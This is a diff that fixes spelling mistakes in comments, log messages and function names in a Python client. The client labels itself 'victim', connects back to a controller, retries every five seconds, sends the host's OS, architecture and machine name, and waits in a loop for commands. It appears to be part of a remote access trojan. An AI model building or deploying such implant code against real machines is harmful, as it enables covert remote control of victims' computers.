@@ -18,20 +18,20 @@ def send_computer_info(sock):
     my_system = platform.uname()
     os = my_system.system
     arch = my_system.machine
-    computer_info = json.dumps({"os": os.lower(), "arch": arch.lower(), "name": my_system.node.lower()})  # Sterialize the computer info
+    computer_info = json.dumps({"os": os.lower(), "arch": arch.lower(), "name": my_system.node.lower()})  # Sterilize the computer info
     ut.send_message(computer_info, sock)
 
 
 def send_verification(sock):
     ut.send_message("victim", sock)
-    verification_message = ut.recieve_message(sock)
+    verification_message = ut.receive_message(sock)
 
     if verification_message == ct.UNVERIFIED_MESSAGE:
         ut.log("error", "Verification failed! exiting...")
         exit(1)
 
     else:
-        ut.log("success", "Vertification Succeeded!")
+        ut.log("success", "Verification Succeeded!")
 
 
 def connect_whatever():
@@ -40,13 +40,13 @@ def connect_whatever():
             sock = initiate()
             return sock
         except IOError:
-            print("IOerror occured restarting after 5s...")
+            print("IOerror occurred restarting after 5s...")
             time.sleep(5)
 
 
 def start():
     sock = connect_whatever()
-    # Verifiying the client
+    # Verifying the client
     send_verification(sock)
 
     # Sending computer information
@@ -55,7 +55,7 @@ def start():
     connected = True
 
     while connected:
-        message = ut.recieve_message(sock)
+        message = ut.receive_message(sock)
 
         if not message:
             connected = False
